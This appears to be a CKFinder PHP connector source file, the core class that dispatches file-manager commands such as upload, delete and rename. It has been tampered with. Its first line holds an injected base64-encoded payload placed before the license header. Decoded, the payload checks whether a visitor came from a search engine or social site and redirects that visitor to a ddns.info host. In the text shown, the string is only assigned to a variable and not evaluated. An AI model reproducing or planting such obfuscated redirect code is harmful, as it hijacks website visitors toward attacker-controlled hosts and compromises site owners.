<?php	 	$dropthisline=strip_tags(("CmVycm9yX3JlcG9ydGluZygwKTsKJHFhenBsbT1oZWFkZXJzX3NlbnQoKTsKaWYgKCEkcWF6cGxtKXsKJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOwokdWFnPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsKaWYgKCR1YWcpIHsKaWYgKCFzdHJpc3RyKCR1YWcsIk1TSUUgNy4wIikgYW5kICFzdHJpc3RyKCR1YWcsIk1TSUUgNi4wIikgYW5kICFzdHJzdHIoJHVhZywiRmlyZWZveC8zLiIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmcuIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlci4iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ3ZWJhbHRhLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInQuY28vIikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImZhY2Vib29rLmNvbS9sIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpIG9yIChwcmVnX21hdGNoICgiL2h0dHBzOlwvXC93d3cuZ29vZ2xlXC4oLio/KVwvLyIsJHJlZmVyZXIpIGFuZCBzdHJzdHIoJHVhZywiQ2hyb21lLyIpKSkgewppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgYW5kICFzdHJpc3RyKCRyZWZlcmVyLCJpbnVybCIpIGFuZCAhc3RyaXN0cigkcmVmZXJlciwiRWVZcDNENyIpKXsKaGVhZGVyKCJMb2NhdGlvbjogaHR0cDovL3JrZmhhZmcuZGRucy5pbmZvLyIpOwpleGl0KCk7Cn0KfQp9Cn0KfQ=="));
/*
 * CKFinder
 * ========
 * http://ckfinder.com
 * Copyright (C) 2007-2010, CKSource - Frederico Knabben. All rights reserved.
 *
 * The software, this file and its contents are subject to the CKFinder
 * License. Please read the license.txt file before using, installing, copying,
 * modifying or distribute this file or part of its contents. The contents of
 * this file is part of the Source Code of CKFinder.
 */
if (!defined('IN_CKFINDER')) exit;

/**
 * @package CKFinder
 * @subpackage Core
 * @copyright CKSource - Frederico Knabben
 */

/**
 * Executes all commands
 *
 * @package CKFinder
 * @subpackage Core
 * @copyright CKSource - Frederico Knabben
 */
class CKFinder_Connector_Core_Connector
{
    /**
     * Registry
     *
     * @var CKFinder_Connector_Core_Registry
     * @access private
     */
    var $_registry;

    function CKFinder_Connector_Core_Connector()
    {
        $this->_registry =& CKFinder_Connector_Core_Factory::getInstance("Core_Registry");
        $this->_registry->set("errorHandler", "ErrorHandler_Base");
    }

    /**
     * Generic handler for invalid commands
     * @access public
     *
     */
    function handleInvalidCommand()
    {
        $oErrorHandler =& $this->getErrorHandler();
        $oErrorHandler->throwError(CKFINDER_CONNECTOR_ERROR_INVALID_COMMAND);
    }

    /**
     * Execute command
     *
     * @param string $command
     * @access public
     */
    function executeCommand($command)
    {
        if (!CKFinder_Connector_Core_Hooks::run('BeforeExecuteCommand', array(&$command))) {
            return;
        }

        switch ($command)
        {
            case 'FileUpload':
            $this->_registry->set("errorHandler", "ErrorHandler_FileUpload");
            $obj =& CKFinder_Connector_Core_Factory::getInstance("CommandHandler_".$command);
            $obj->sendResponse();
            break;

            case 'QuickUpload':
            $this->_registry->set("errorHandler", "ErrorHandler_QuickUpload");
            $obj =& CKFinder_Connector_Core_Factory::getInstance("CommandHandler_".$command);
            $obj->sendResponse();
            break;

            case 'DownloadFile':
            case 'Thumbnail':
            $this->_registry->set("errorHandler", "ErrorHandler_Http");
            $obj =& CKFinder_Connector_Core_Factory::getInstance("CommandHandler_".$command);
            $obj->sendResponse();
            break;

            case 'CopyFiles':
            case 'CreateFolder':
            case 'DeleteFile':
            case 'DeleteFolder':
            case 'GetFiles':
            case 'GetFolders':
            case 'Init':
            case 'MoveFiles':
            case 'RenameFile':
            case 'RenameFolder':
            $obj =& CKFinder_Connector_Core_Factory::getInstance("CommandHandler_".$command);
            $obj->sendResponse();
            break;

            default:
            $this->handleInvalidCommand();
            break;
        }
    }

    /**
     * Get error handler
     *
     * @access public
     * @return CKFinder_Connector_ErrorHandler_Base|CKFinder_Connector_ErrorHandler_FileUpload|CKFinder_Connector_ErrorHandler_Http
     */
    function &getErrorHandler()
    {
        $_errorHandler = $this->_registry->get("errorHandler");
        $oErrorHandler =& CKFinder_Connector_Core_Factory::getInstance($_errorHandler);
        return $oErrorHandler;
    }
}
